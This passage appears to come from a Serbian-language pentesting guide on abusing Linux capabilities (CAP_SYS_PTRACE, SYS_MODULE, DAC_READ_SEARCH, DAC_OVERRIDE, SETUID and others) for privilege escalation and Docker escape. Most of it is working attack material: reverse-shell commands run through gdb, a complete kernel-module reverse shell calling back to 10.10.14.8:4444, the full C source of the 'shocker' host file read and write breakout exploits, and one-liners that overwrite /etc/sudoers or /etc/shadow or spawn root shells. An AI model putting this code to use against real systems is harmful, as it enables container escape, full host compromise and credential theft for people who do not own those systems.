process 207009 is executing new program: /usr/bin/dash
[...]
```

**Primer sa okruženjem (Docker probijanje) - Još jedna zloupotreba gdb-a**

Ako je **GDB** instaliran (ili ga možete instalirati sa `apk add gdb` ili `apt install gdb` na primer), možete **debugirati proces sa hosta** i naterati ga da pozove funkciju `system`. (Ova tehnika takođe zahteva mogućnost `SYS_ADMIN`).

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

Nećete moći videti izlaz izvršene komande, ali će se ona izvršiti od strane tog procesa (tako da dobijete reverznu ljusku).

{% hint style="warning" %}
Ako dobijete grešku "No symbol "system" in current context.", proverite prethodni primer učitavanja shell koda u program putem gdb-a.
{% endhint %}

**Primer sa okruženjem (Docker izlazak) - Ubacivanje shell koda**

Možete proveriti omogućene sposobnosti unutar Docker kontejnera koristeći:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

Lista **procesa** koji se izvršavaju na **hostu** `ps -eaf`

1. Dobijanje **arhitekture** `uname -m`
2. Pronalaženje **shellcode-a** za tu arhitekturu ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Pronalaženje **programa** za **ubacivanje** shellcode-a u memoriju procesa ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Izmena** shellcode-a unutar programa i **kompajliranje** `gcc inject.c -o inject`
5. **Ubacivanje** i preuzimanje **shell-a**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

[**`CAP_SYS_MODULE`**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava procesu da **učitava i uklanja kernel module (`init_module(2)`, `finit_module(2)` i `delete_module(2)` sistemski pozivi)**, pružajući direktni pristup osnovnim operacijama kernela. Ova sposobnost predstavlja ozbiljan sigurnosni rizik, jer omogućava eskalaciju privilegija i potpunu kompromitaciju sistema omogućavajući modifikacije kernela, čime se zaobilaze svi Linux mehanizmi bezbednosti, uključujući Linux Security Module i izolaciju kontejnera. **Ovo znači da možete** **ubacivati/uklanjati kernel module u/iz kernela host mašine.**

**Primer sa binarnim fajlom**

U sledećem primeru binarni fajl **`python`** ima ovu sposobnost.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

Podrazumevano, **`modprobe`** komanda proverava listu zavisnosti i mapne fajlove u direktorijumu **`/lib/modules/$(uname -r)`**.\
Da bismo iskoristili ovo, kreirajmo lažni **lib/modules** folder:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Zatim **kompajlirajte kernel modul koji možete pronaći u donjem primeru i kopirajte** ga u ovaj folder:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Na kraju, izvršite potreban Python kod za učitavanje ovog jezgračkog modula:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**Primer 2 sa binarnim fajlom**

U sledećem primeru binarni fajl **`kmod`** ima ovu sposobnost.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Što znači da je moguće koristiti komandu **`insmod`** za umetanje jezgrovnog modula. Sledite primer ispod da biste dobili **obrnuto ljusku** zloupotrebljavajući ovu privilegiju.

**Primer sa okruženjem (Docker izlazak iz okvira)**

Možete proveriti omogućene sposobnosti unutar Docker kontejnera koristeći:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Unutar prethodnog izlaza možete videti da je omogućena sposobnost **SYS\_MODULE**.

**Napravite** **kernel modul** koji će izvršiti obrnutu ljusku i **Makefile** za njegovo **kompajliranje**:

{% code title="reverse-shell.c" %}
```
```
{% endcode %}

```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Prazan karakter ispred svake reči u Makefile **mora biti tabulator, ne razmaci**!
{% endhint %}

Izvršite `make` da biste ga kompajlirali.

```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Na kraju, pokrenite `nc` unutar jedne ljuske i **učitajte modul** iz druge ljuske kako biste uhvatili ljusku u procesu nc:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**Kod ove tehnike je kopiran iz laboratorije "Zloupotreba SYS\_MODULE sposobnosti" sa** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Još jedan primer ove tehnike može se pronaći na [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava procesu da **zaobiđe dozvole za čitanje fajlova i za čitanje i izvršavanje direktorijuma**. Njegova osnovna namena je pretraga fajlova ili čitanje fajlova. Međutim, takođe omogućava procesu da koristi funkciju `open_by_handle_at(2)`, koja može pristupiti bilo kom fajlu, uključujući one van mount namespace-a procesa. Handle koji se koristi u `open_by_handle_at(2)` trebao bi biti netransparentni identifikator dobijen putem `name_to_handle_at(2)`, ali može sadržati osetljive informacije poput brojeva inode-a koji su podložni manipulaciji. Potencijal za iskorišćavanje ove sposobnosti, posebno u kontekstu Docker kontejnera, demonstrirao je Sebastian Krahmer sa exploitom shocker, kako je analizirano [ovde](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3). **Ovo znači da možete zaobići provere dozvola za čitanje fajlova i provere dozvola za čitanje/izvršavanje direktorijuma.**

**Primer sa binarnim fajlom**

Binarni fajl će moći da čita bilo koji fajl. Dakle, ako fajl poput tar-a ima ovu sposobnost, biće u mogućnosti da čita shadow fajl:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**Primer sa binary2**

U ovom slučaju pretpostavimo da **`python`** binarna datoteka ima ovu sposobnost. Da biste izlistali root fajlove, možete uraditi sledeće:

```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```

I da biste pročitali datoteku, možete uraditi sledeće:

```python
print(open("/etc/shadow", "r").read())
```

**Primer u okruženju (Docker probijanje)**

Možete proveriti omogućene sposobnosti unutar Docker kontejnera koristeći:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Unutar prethodnog izlaza možete videti da je omogućena sposobnost **DAC\_READ\_SEARCH**. Kao rezultat toga, kontejner može **debagovati procese**.

Možete saznati kako funkcioniše sledeće iskorišćavanje na [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ali ukratko, **CAP\_DAC\_READ\_SEARCH** nam ne samo omogućava da prolazimo kroz fajl sistem bez provere dozvola, već takođe eksplicitno uklanja bilo kakve provere za _**open\_by\_handle\_at(2)**_ i **može dozvoliti našem procesu da pristupi osetljivim fajlovima otvorenim od strane drugih procesa**.

Originalni exploit koji zloupotrebljava ove dozvole kako bi čitao fajlove sa hosta može se pronaći ovde: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), sledeća je **izmenjena verzija koja vam omogućava da naznačite fajl koji želite da pročitate kao prvi argument i da ga ispišete u fajl.**

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```

{% hint style="warning" %}
Eksploatacija mora pronaći pokazivač na nešto montirano na hostu. Originalna eksploatacija koristi datoteku /.dockerinit, a ova izmenjena verzija koristi /etc/hostname. Ako eksploatacija ne radi, možda trebate postaviti drugu datoteku. Da biste pronašli datoteku koja je montirana na hostu, jednostavno izvršite naredbu mount:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**Kod ove tehnike je kopiran iz laboratorije "Zloupotreba mogućnosti DAC\_READ\_SEARCH" sa** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji događaj u oblasti sajber bezbednosti u **Španiji** i jedan od najvažnijih u **Evropi**. Sa **misijom promovisanja tehničkog znanja**, ovaj kongres je ključno mesto susreta tehnoloških i sajber bezbednosnih stručnjaka u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Ovo znači da možete zaobići provere dozvola za pisanje na bilo kojoj datoteci, tako da možete pisati bilo koju datoteku.**

Postoji mnogo datoteka koje možete **prepisati da biste povećali privilegije,** [**možete dobiti ideje ovde**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Primer sa binarnom datotekom**

U ovom primeru, vim ima ovu mogućnost, tako da možete izmeniti bilo koju datoteku poput _passwd_, _sudoers_ ili _shadow_:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**Primer sa binarnim brojem 2**

U ovom primeru, binarni broj **`python`** će imati ovu sposobnost. Možete koristiti python da prepišete bilo koji fajl:

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**Primer sa okruženjem + CAP\_DAC\_READ\_SEARCH (Docker probijanje izolacije)**

Možete proveriti omogućene sposobnosti unutar Docker kontejnera koristeći:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Prvo pročitajte prethodni odeljak koji [**zloupotrebljava mogućnost DAC\_READ\_SEARCH za čitanje proizvoljnih datoteka**](linux-capabilities.md#cap\_dac\_read\_search) na hostu i **kompajlirajte** eksploit.\
Zatim, **kompajlirajte sledeću verziju eksploita shocker** koja će vam omogućiti da **pišete proizvoljne datoteke** unutar fajl sistema hosta:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```

Da biste pobegli iz Docker kontejnera, možete **preuzeti** fajlove `/etc/shadow` i `/etc/passwd` sa hosta, **dodati** im **novog korisnika**, i koristiti **`shocker_write`** da ih prepišete. Zatim, **pristupite** putem **ssh**.

**Kod ove tehnike je kopiran iz laboratorije "Zloupotreba DAC\_OVERRIDE mogućnosti" sa** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**Ovo znači da je moguće promeniti vlasništvo bilo kog fajla.**

**Primer sa binarnim fajlom**

Pretpostavimo da **`python`** binarni fajl ima ovu mogućnost, možete **promeniti** **vlasnika** fajla **shadow**, **promeniti root lozinku**, i eskalirati privilegije:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Ili sa **`ruby`** binarnim fajlom koji ima ovu sposobnost:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP\_FOWNER

**Ovo znači da je moguće promeniti dozvole bilo koje datoteke.**

**Primer sa binarnim fajlom**

Ako Python ima ovu sposobnost, možete promeniti dozvole fajla shadow, **promeniti root lozinku**, i povećati privilegije:

```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```

### CAP\_SETUID

**Ovo znači da je moguće postaviti efektivni korisnički ID kreiranog procesa.**

**Primer sa binarnim fajlom**

Ako python ima ovu **mogućnost**, vrlo lako je zloupotrebiti je kako bi se povećale privilegije do root korisnika:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Još jedan način:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

## CAP\_SETGID

**Ovo znači da je moguće postaviti efektivni grupni ID kreiranog procesa.**

Postoji mnogo datoteka koje možete **prepisati da biste povećali privilegije,** [**možete dobiti ideje ovde**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Primer sa binarnom datotekom**

U ovom slučaju trebali biste tražiti zanimljive datoteke koje grupa može čitati jer možete preuzeti identitet bilo koje grupe:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Jednom kada pronađete datoteku koju možete zloupotrebiti (čitanjem ili pisanjem) kako biste povećali privilegije, možete **dobiti shell koji se predstavlja kao interesantna grupa** pomoću:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

U ovom slučaju grupa shadow je preuzeta kako biste mogli čitati datoteku `/etc/shadow`:

```bash
cat /etc/shadow
```

Ako je instaliran **docker**, mogli biste **preuzeti identitet** **docker grupe** i zloupotrebiti je za komunikaciju sa [**docker socket-om** i eskalaciju privilegija](./#writable-docker-socket).

## CAP\_SETFCAP

**Ovo znači da je moguće postaviti sposobnosti na datoteke i procese**

**Primer sa binarnom datotekom**

Ako python ima ovu **sposobnost**, veoma lako je zloupotrebiti je za eskalaciju privilegija do root-a:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}

```bash
python setcapability.py /usr/bin/python2.7
```

{% hint style="warning" %}
Imajte na umu da ako postavite novu sposobnost binarnom fajlu sa CAP\_SETFCAP, izgubićete ovu sposobnost.
{% endhint %}

Kada imate [SETUID sposobnost](linux-capabilities.md#cap\_setuid), možete pogledati njegovu sekciju da biste videli kako da povećate privilegije.

**Primer sa okruženjem (Docker izlazak iz okvira)**

Podrazumevano, sposobnost **CAP\_SETFCAP je dodeljena procesu unutar kontejnera u Docker-u**. Možete proveriti to tako što ćete uraditi nešto kao:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

Ova sposobnost omogućava **davanje bilo koje druge sposobnosti binarnim datotekama**, tako da možemo razmišljati o **izlasku** iz kontejnera **zloupotrebom bilo kojeg od drugih probijanja sposobnosti** navedenih na ovoj stranici.\
Međutim, ako pokušate dati, na primer, sposobnosti CAP\_SYS\_ADMIN i CAP\_SYS\_PTRACE binarnoj datoteci gdb, primetićete da možete da ih dodelite, ali **binarna datoteka neće moći da se izvrši nakon toga**:

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

[Od dokumentacije](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Dozvoljeno: Ovo je **ograničavajući nadskup za efektivne sposobnosti** koje nit može preuzeti. Takođe je ograničavajući nadskup za sposobnosti koje mogu biti dodate nasleđenom skupu od strane niti koja **nema CAP\_SETPCAP sposobnost u svom efektivnom skupu**._\
Izgleda da dozvoljene sposobnosti ograničavaju one koje se mogu koristiti.\
Međutim, Docker takođe podrazumevano dodeljuje **CAP\_SETPCAP**, pa biste možda mogli **postaviti nove sposobnosti unutar nasleđenih**.\
Međutim, u dokumentaciji ove sposobnosti: _CAP\_SETPCAP: \[…] **dodaje bilo koju sposobnost iz ograničavajućeg skupa pozivajuće niti** u njen nasleđeni skup_.\
Izgleda da možemo dodati samo sposobnosti iz ograničavajućeg skupa u nasleđeni skup. Što znači da **ne možemo dodati nove sposobnosti poput CAP\_SYS\_ADMIN ili CAP\_SYS\_PTRACE u nasleđeni skup kako bismo eskalirali privilegije**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) pruža nekoliko osetljivih operacija, uključujući pristup `/dev/mem`, `/dev/kmem` ili `/proc/kcore`, izmenu `mmap_min_addr`, pristup sistemskim pozivima `ioperm(2)` i `iopl(2)`, kao i različite disk komande. `FIBMAP ioctl(2)` je takođe omogućen putem ove sposobnosti, što je izazvalo probleme u [prošlosti](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Prema stranici sa uputstvima, ovo takođe omogućava nosiocu da **opisno izvršava niz uređaj-specifičnih operacija na drugim uređajima**.

Ovo može biti korisno za **eskalaciju privilegija** i **izlazak iz Docker kontejnera**.

## CAP\_KILL

**Ovo znači da je moguće ubiti bilo koji proces.**

**Primer sa binarnim fajlom**

Pretpostavimo da **`python`** binarni fajl ima ovu sposobnost. Ako biste mogli **takođe izmeniti neku konfiguraciju servisa ili soketa** (ili bilo koji konfiguracioni fajl koji se odnosi na servis), mogli biste ga napraviti sa zadnjim vratima, a zatim ubiti proces koji je povezan sa tim servisom i sačekati da se izvrši novi konfiguracioni fajl sa vašim zadnjim vratima.

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc sa kill**

Ako imate kill mogućnosti i postoji **node program koji se izvršava kao root** (ili kao drugi korisnik), verovatno možete mu **poslati** signal **SIGUSR1** i naterati ga da **otvori node debager** gde se možete povezati.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

